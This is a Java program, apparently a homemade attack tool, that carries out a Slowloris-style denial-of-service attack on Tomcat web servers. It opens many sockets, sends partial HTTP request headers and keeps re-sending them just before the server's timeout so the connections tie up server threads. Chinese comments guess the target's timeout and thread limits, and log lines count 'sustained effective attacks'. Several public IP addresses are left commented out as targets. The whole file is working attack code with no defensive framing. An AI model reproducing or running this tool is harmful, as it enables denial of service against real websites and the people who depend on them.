package gongji.tomcat;import java.io.BufferedReader;import java.io.BufferedWriter;import java.io.DataInputStream;import java.io.IOException;import java.io.InputStreamReader;import java.io.OutputStreamWriter;import java.net.InetSocketAddress;import java.net.Socket;import java.net.UnknownHostException;import java.nio.ByteBuffer;import java.nio.channels.SelectionKey;import java.nio.channels.Selector;import java.nio.channels.SocketChannel;import java.util.ArrayList;import java.util.Iterator;import java.util.List;public class SocketClientsGetGongJi {//	 public static String ip = "202.85.219.241";//	 public static String ip = "218.241.159.155";//	 http://localhost		 public static String ip = "127.0.0.1";//	public static String ip = "61.182.251.132";	public static int port = 8080;	// 猜测对方设置的时间 默认20s	public static int timeOut = 20;	// // 猜测对方设置的最高线程数量 默认154	public static int sockets = 20;	private Selector selector;	private List<linker> mlist = new ArrayList<linker>();	public byte bs[]=new byte[10];		boolean is_add_socket_ing;	public class linker {		Socket s;		BufferedWriter bw;		BufferedReader br;				public DataInputStream mInputStream;		linker(Socket s) throws IOException {			this.s = s;			bw = new BufferedWriter(new OutputStreamWriter(s.getOutputStream()));			mInputStream = new DataInputStream(s.getInputStream());//			br=new BufferedReader(new InputStreamReader(s.getInputStream()));		}		void get() throws IOException {//			GET /resources/images/index_new_banner.jpg HTTP/1.1//			Host: localhost:8080//			Connection: keep-alive//			User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.4//			Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8//			Accept-Encoding: gzip,deflate,sdch//			Accept-Language: zh-CN,zh;q=0.8//			Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3									if(s.isConnected()){							bw.write("GET /tomcat.png HTTP/1.1\n");			bw.write("Host: localhost:8080\n");			bw.write("Connection: keep-alive\n");			bw.write("User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.4\n");			bw.flush();			System.out.println("GET /tomcat.png ");			int k=mInputStream.read(bs);			System.out.println("read");			System.out.println(k+"get");			}else{				s.close();				mlist.remove(this);			}		}					}	public static void main(String[] args) throws IOException {		SocketClientsGetGongJi m = new SocketClientsGetGongJi();		m.allLink();		m.initMoreClient(ip, port, sockets);	}	private void initMoreClient(String ip, int port, int j) {		// TODO Auto-generated method stub				is_add_socket_ing=true;		for (int i = 0; i < j; i++) {			System.out.println("" + i + " " + j);			try {				Socket s = new Socket(ip, port);				linker l = new linker(s);				l.get();				this.mlist.add(l);			} catch (UnknownHostException e) {				// TODO Auto-generated catch block				e.printStackTrace();			} catch (IOException e) {				// TODO Auto-generated catch block				e.printStackTrace();			}		}				is_add_socket_ing=false;	}	public void initOneClient(String ip, int port) {		SocketChannel channel;		try {			channel = SocketChannel.open();			channel.configureBlocking(false);			channel.connect(new InetSocketAddress(ip, port));			// System.out.println(channel.socket().getPort());			channel.register(selector, SelectionKey.OP_CONNECT);		} catch (IOException e) {			// TODO Auto-generated catch block			e.printStackTrace();		}	}	private void allLink() {		// TODO Auto-generated method stub		new Thread(new Runnable() {			@Override			public void run() {				// TODO Auto-generated method stub				long ti = (timeOut - 1) * 1000L;				while (true) {					// 最少次数的发送 减少网络占用					try {						Thread.sleep(ti);					} catch (InterruptedException e1) {						// TODO Auto-generated catch block						e1.printStackTrace();					}					// 如果已经建立过相当多的连接					final int k = sockets							- SocketClientsGetGongJi.this.mlist.size();					if (k > 0&&is_add_socket_ing!=true) {						new Thread(new Runnable() {							@Override							public void run() {								// TODO Auto-generated method stub								System.err.println("XXX无效的工具数量  缺少  现在添加" + k);								SocketClientsGetGongJi.this.initMoreClient(ip,										port, k);							}						}).start();					}					System.out.println("持续有效的攻击: "							+ SocketClientsGetGongJi.this.mlist.size()							+ " send....骗子");					for (int i = 0; i < SocketClientsGetGongJi.this.mlist.size(); i++) {						linker l = null;						try {							l = SocketClientsGetGongJi.this.mlist.get(i);							l.get();						} catch (IOException e) {							// TODO Auto-generated catch block//							e.printStackTrace();							System.err.println("send error");							SocketClientsGetGongJi.this.mlist.remove(l);						}					}										System.out.println("send ok");				}			}		}).start();	}}